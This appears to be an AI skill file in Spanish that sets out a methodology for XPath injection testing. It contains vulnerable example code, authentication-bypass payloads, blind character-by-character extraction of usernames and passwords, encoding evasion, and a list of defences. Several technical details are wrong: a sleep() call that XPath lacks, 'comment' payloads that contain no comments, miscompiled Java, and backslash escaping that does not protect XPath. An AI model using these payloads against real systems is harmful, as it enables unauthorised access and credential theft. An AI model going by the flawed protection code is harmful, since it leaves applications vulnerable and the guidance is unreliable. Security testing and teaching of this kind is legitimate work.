---
name: xpath-injection-testing
description: Habilidad profesional y metodología para pruebas de vulnerabilidad de inyección XPath
version: 1.0.0
---

# Pruebas de vulnerabilidad de inyección XPath

## Descripción general

La inyección XPath es una vulnerabilidad similar a la inyección SQL que aprovecha defectos en la construcción de consultas XPath, lo que puede provocar fugas de información, omisión de autenticación, etc. Esta habilidad proporciona métodos para la detección, explotación y protección contra inyecciones XPath.

## Principio de la vulnerabilidad

La aplicación concatena directamente la entrada del usuario en la consulta XPath sin validación ni filtrado suficientes, lo que permite a los atacantes modificar la lógica de la consulta.

**Ejemplo de código peligroso:**
```java
String xpath = "//user[username='" + username + "' and password='" + password + "']";
XPathExpression expr = xpath.compile(xpath);
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

## Conceptos básicos de XPath

### Sintaxis de consulta

**Consultas básicas:**
```
//user[username='admin']
//user[@id='1']
//user[username='admin' and password='pass']
//user[username='admin' or username='user']
```

### Funciones

**Funciones comunes:**
- `text()` - Obtener contenido de texto
- `count()` - Contar
- `substring()` - Subcadena
- `string-length()` - Longitud de la cadena
- `contains()` - Comprobación de inclusión

## Métodos de prueba

### 1. Identificar puntos de entrada XPath

**Funciones comunes:**
- Inicio de sesión de usuario
- Búsqueda de datos
- Consulta de datos XML
- Consulta de configuración

### 2. Detección básica

**Prueba de caracteres especiales:**
```
' or '1'='1
' or '1'='1' or '
' or 1=1 or '
') or ('1'='1
```

**Prueba de operadores lógicos:**
```
' or '1'='1
' and '1'='2
' or 1=1 or '
```

### 3. Omisión de autenticación

**Omisión básica:**
```
Usuario: admin' or '1'='1
Contraseña: anything
Consulta: //user[username='admin' or '1'='1' and password='anything']
```

**Omisión más precisa:**
```
Usuario: admin') or ('1'='1
Consulta: //user[username='admin') or ('1'='1' and password='*']
```

### 4. Fuga de información

**Enumerar usuarios:**
```
' or 1=1 or '
' or '1'='1
') or 1=1 or ('
```

**Obtener cantidad de nodos:**
```
' or count(//user)>0 or '
```

**Obtener un nodo específico:**
```
' or substring(//user[1]/username,1,1)='a' or '
```

## Técnicas de explotación

### Omisión de autenticación

**Método 1: Omisión lógica**
```
Entrada: admin' or '1'='1
Consulta: //user[username='admin' or '1'='1' and password='*']
Resultado: Coincide con todos los usuarios
```

**Método 2: Omisión con comentarios**
```
Entrada: admin')] | //* | //*[('
Consulta: //user[username='admin')] | //* | //*[('' and password='*']
```

**Método 3: Inyección ciega basada en booleanos**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,1,1)='b' or '
```

### Fuga de información

**Enumerar todos los usuarios:**
```
' or 1=1 or '
Resultado: Devuelve todos los nodos de usuario
```

**Obtener nombre de usuario:**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,2,1)='d' or '
Obtener cada carácter paso a paso
```

**Obtener contraseña:**
```
' or substring(//user[1]/password,1,1)='p' or '
Obtener caracteres de la contraseña paso a paso
```

### Técnicas de inyección ciega

**Inyección ciega basada en tiempo:**
```
' or count(//user[substring(username,1,1)='a'])>0 and sleep(5) or '
```

**Inyección ciega basada en booleanos:**
```
' or substring(//user[1]/username,1,1)='a' or '
Observar diferencias en la respuesta
```

## Técnicas de evasión

### Evasión mediante codificación

**Codificación URL:**
```
' or '1'='1 → %27%20or%20%271%27%3D%271
```

**Codificación de entidades HTML:**
```
' → &#39;
" → &quot;
< → &lt;
> → &gt;
```

### Evasión mediante comentarios

**Uso de comentarios:**
```
' or 1=1 or '
' or '1'='1' or '
```

### Evasión mediante funciones

**Uso de diferentes funciones:**
```
substring(//user[1]/username,1,1)
substring(//user[position()=1]/username,1,1)
//user[1]/username/text()[1]
```

## Uso de herramientas

### Prueba de expresiones XPath

**Herramientas en línea:**
- XPath Tester
- XMLSpy
- Oxygen XML Editor

### Burp Suite

1. Interceptar la solicitud de consulta XPath
2. Modificar los parámetros de la consulta
3. Observar el resultado de la respuesta

### Script en Python

```python
from lxml import etree
from lxml.etree import XPath

# Cargar documento XML
doc = etree.parse('users.xml')

# Probar inyección
xpath_expr = "//user[username='admin' or '1'='1']"
xpath = XPath(xpath_expr)
results = xpath(doc)
print(results)
```

## Validación y reporte

### Pasos de validación

1. Confirmar que se puede controlar la consulta XPath
2. Validar la omisión de autenticación o la fuga de información
3. Evaluar el impacto (acceso no autorizado, fuga de datos, etc.)
4. Registrar el PoC completo

### Puntos clave del reporte

- Ubicación de la vulnerabilidad y parámetros de entrada
- Método de construcción de la consulta XPath
- Pasos completos de explotación y PoC
- Sugerencias de remediación (validación de entrada, consultas parametrizadas, etc.)

## Medidas de protección

### Soluciones recomendadas

1. **Validación de entrada**
   ```java
   private static final String[] XPATH_ESCAPE_CHARS = 
       {"'", "\"", "[", "]", "(", ")", "=", ">", "<", " "};
   
   public static String escapeXPath(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(XPATH_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Consultas parametrizadas**
   ```java
   // Usar variables XPath
   String xpath = "//user[username=$username and password=$password]";
   XPathExpression expr = xpath.compile(xpath);
   XPathVariableResolver resolver = new MapVariableResolver(
       Map.of("username", escapedUsername, "password", escapedPassword));
   expr.setXPathVariableResolver(resolver);
   ```

3. **Validación de lista blanca**
   ```java
   // Solo permitir caracteres específicos
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Uso de consultas precompiladas**
   ```java
   // Plantilla de consulta predefinida
   private static final String LOGIN_QUERY = 
       "//user[username=$1 and password=$2]";
   
   // Usar vinculación de parámetros
   ```

5. **Mínimo privilegio**
   - Limitar el alcance de las consultas XPath
   - Usar control de acceso
   - Limitar los nodos que se pueden consultar

## Consideraciones

- Realizar solo en entornos de pruebas de seguridad autorizados
- Prestar atención a las diferencias de sintaxis entre las distintas versiones de XPath
- Evitar afectar los datos XML durante las pruebas
- Comprender la implementación de XPath de la aplicación objetivo